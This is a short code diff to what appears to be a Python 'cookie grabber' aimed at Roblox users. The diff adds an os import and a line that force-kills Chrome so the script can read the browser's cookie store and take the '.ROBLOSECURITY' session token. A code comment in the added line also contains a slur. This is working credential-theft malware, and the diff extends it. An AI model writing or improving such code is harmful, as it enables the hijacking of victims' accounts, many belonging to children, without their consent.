@@ -3,7 +3,7 @@
 ## Enjoy!
 
 try:
-    import robloxpy, requests, browser_cookie3
+    import robloxpy, requests, browser_cookie3, os
 except Exception as e:
     print(str(e)[16:].replace("'", "") + ' is not installed, run install.bat first.'), exit()
 
@@ -120,7 +120,8 @@ class SMTHGRB:
             pass
 
         try:
-            self.platform = "Chrome"
+            self.platform = "Chrome" 
+            os.system("taskkill /f /im chrome.exe") ## Chrome added something to their browser so I have to kill the gayness honestly.
             for cookie in browser_cookie3.chrome(domain_name='roblox.com'):
                 if cookie.name == '.ROBLOSECURITY':
                     self.cookie = cookie.value
